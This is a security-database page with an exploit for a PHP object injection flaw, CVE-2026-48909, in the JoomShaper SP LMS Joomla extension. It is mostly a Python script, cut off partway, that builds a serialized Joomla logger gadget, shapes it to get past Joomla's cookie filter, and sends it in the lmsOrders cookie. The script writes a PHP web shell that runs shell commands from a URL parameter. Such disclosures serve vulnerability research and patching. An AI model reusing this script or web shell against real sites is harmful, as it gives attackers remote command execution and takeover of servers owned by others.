---
title: Joomla Extension 4.1.4 PHP Object injection
url: https://cxsecurity.com/issue/WLB-2026080009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-08-12
fetch_date: 2026-08-13T04:02:47.141373
---

# Joomla Extension 4.1.4 PHP Object injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Joomla Extension 4.1.4 PHP Object injection** **2026.08.12**  Credit:  **[Amin İsayev](https://cxsecurity.com/author/Amin%2B%C4%B0sayev%2B/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-48909](https://cxsecurity.com/cveshow/CVE-2026-48909/ "Click to see CVE-2026-48909")**  CWE: **N/A** | |

Exploit Ttile: Joomla Extension 4.1.4 - PHP Object injection
Affected : JoomShaper SP LMS <= 4.1.3
Fixed : JoomShaper SP LMS >= 4.1.4
Author : Amin İsayev / Proxima Cyber Security
Joomla version note:
RCE requires Joomla < 5.2.2
Joomla >= 5.2.2 patched FormattedtextLogger.\_\_wakeup() which blocks the
gadget chain — PHP Object Injection still exists in com\_splms but no
known public gadget chain leads to RCE on patched Joomla versions.
Attack chain:
lmsOrders cookie
→ unserialize(base64\_decode($cookie)) [com\_splms/models/cart.php:28]
→ FormattedtextLogger.\_\_destruct() [Joomla gadget]
→ File::write($path, $format)
→ webshell on disk
Joomla Input filter note:
$cookie->get() uses 'cmd' filter by default → strips '/', '=', '+' from cookie.
Fix: pad format string so serialized total is divisible by 3 (no '=') and
iterate until base64 has no '/' (shifts encoding).
Format string uses hex2bin() to avoid forbidden chars: $ \_ { } \n
Usage:
python3 CVE-2026-48909\_exploit.py <target> <server\_path>
server\_path = absolute PHP-writable path on server
Examples :
/var/www/html/tmp/x.php
/home/USER/public\_html/tmp/x.php
/var/www/vhosts/site.com/httpdocs/tmp/x.php
"""
import sys
import base64
import requests
import urllib3
urllib3.disable\_warnings()
CART\_PATH = "/index.php?option=com\_splms&view=cart"
TIMEOUT = 15
WEBSHELL = '<?php fpassthru(popen($\_GET["c"],"r"));?>'
# ─── PHP serializer ───────────────────────────────────────────────────────────
def \_s(s: str) -> str:
return f's:{len(s.encode())}:"{s}";'
def \_pk(name: str) -> str:
"""Protected property key (null-byte notation for string concat)"""
return f'\x00\*\x00{name}'
def \_build\_serialized(webshell\_path: str, fmt: str) -> str:
"""Build the raw PHP serialized string (not yet base64)."""
entry = (
'O:23:"Joomla\\CMS\\Log\\LogEntry":3:{'
's:4:"date";s:10:"1234567890";'
's:4:"time";s:1:"t";'
's:1:"f";s:3:"xxx";'
'}'
)
cn = 'Joomla\\CMS\\Log\\Logger\\FormattedtextLogger'
props = (
\_s(\_pk('defer')) + 'b:1;' +
\_s(\_pk('options')) + 'a:1:{s:16:"text\_file\_no\_php";b:1;}' +
\_s(\_pk('path')) + \_s(webshell\_path) +
\_s(\_pk('deferredEntries')) + f'a:1:{{i:0;{entry}}}' +
\_s(\_pk('format')) + \_s(fmt) +
\_s(\_pk('fields')) + 'a:0:{}'
)
return f'O:{len(cn.encode())}:"{cn}":6:{{{props}}}'
def build\_payload(webshell\_path: str, php\_code: str) -> tuple[str, int]:
"""
Craft a base64 cookie payload that survives Joomla's 'cmd' Input filter.
The filter strips '/', '=' and '+'. We avoid these by:
1. Encoding php\_code as hex → no '$', '\_', '{', '}', '\\n' in format
2. Padding format to make total serialized length divisible by 3 → no '=' padding
3. Iterating pad size (by 3) until base64 contains no '/' chars
Returns (base64\_payload, format\_length).
"""
hex\_code = php\_code.encode().hex()
core = f'<?php fwrite(fopen("{webshell\_path}","w"),hex2bin("{hex\_code}"));'
pad\_prefix = '/\*'
pad\_suffix = '\*/;?>'
PAD\_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
for target\_fmt\_len in range(200, 8000):
pad\_len = target\_fmt\_len - len(core.encode()) - len(pad\_prefix) - len(pad\_suffix)
if pad\_len < 0:
continue
# Quick mod-3 check with first pad\_char before trying all 62
fmt\_probe = core + pad\_prefix + PAD\_CHARS[0] \* pad\_len + pad\_suffix
ser\_probe = \_build\_serialized(webshell\_path, fmt\_probe).encode('latin-1')
if len(ser\_probe) % 3 != 0:
continue # no pad\_char can fix mod-3 alignment for this length
for pad\_char in PAD\_CHARS:
fmt = core + pad\_prefix + pad\_char \* pad\_len + pad\_suffix
serialized = \_build\_serialized(webshell\_path, fmt)
ser\_bytes = serialized.encode('latin-1')
b64 = base64.b64encode(ser\_bytes).decode()
if '/' not in b64 and '+' not in b64:
return b64, len(fmt)
raise RuntimeError("Could not find filter-safe payload — try a different path")
# ─── Exploit ──────────────────────────────────────────────────────────────────
def \_server\_path\_to\_url(server\_path: str) -> str:
"""Strip webroot prefix to get the URL path."""
import re
# cPanel: /home[N]/USER/public\_html/...
m = re.match(r'^/home\d\*/[^/]+/public\_html(/.\*)', server\_path)
if m:
return m.group(1)
# Plesk: /var/www/vhosts/DOMAIN/httpdocs/...
m = re.match(r'^/var/www/vhosts/[^/]+/(?:httpdocs|htdocs|web)(/.\*)', server\_path)
if m:
return m.group(1)
# Standard
for prefix in ('/var/www/html', '/var/www', '/srv/www', '/htdocs', '/www'):
if server\_path.startswith(prefix):
return server\_path[len(prefix):]
return server\_path
def exploit(target: str, server\_path: str) -> None:
url\_path = \_server\_path\_to\_url(server\_path)
cart\_url = target.rstrip('/') + CART\_PATH
shell\_url = target.rstrip('/') + (url\_path if url\_path.startswith('/') else '/' + url\_path)
session = requests.Session()
session.verify = False
session.headers.update({
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
})
print(f"[\*] Target : {target}")
print(f"[\*] Shell path : {server\_path}")
print(f"[\*] Shell URL : {shell\_url}")
print("[\*] Building filter-safe payload...")
payload, fmt\_len = build\_payload(server\_path, WEBSHELL)
print(f"[\*] Format len : {fmt\_len} bytes | Base64 len: {len(payload)}")
print(f"[\*] Payload : {payload[:60]}...")
print()
try:
r = session.get(cart\_url, cookies={'lmsOrders': payload}, timeout=TIMEOUT)
status = r.status\_code
if status == 500:
print(f"[+] HTTP 500 — gadget triggered (FormattedtextLogger.\_\_destruct)")
elif status == 200:
print(f"[?] HTTP 200 — payload may have been filtered or gadget not triggered")
else:
print(f"[?] HTTP {status}")
except requests.RequestException as e:
print(f"[!] Request failed: {e}"...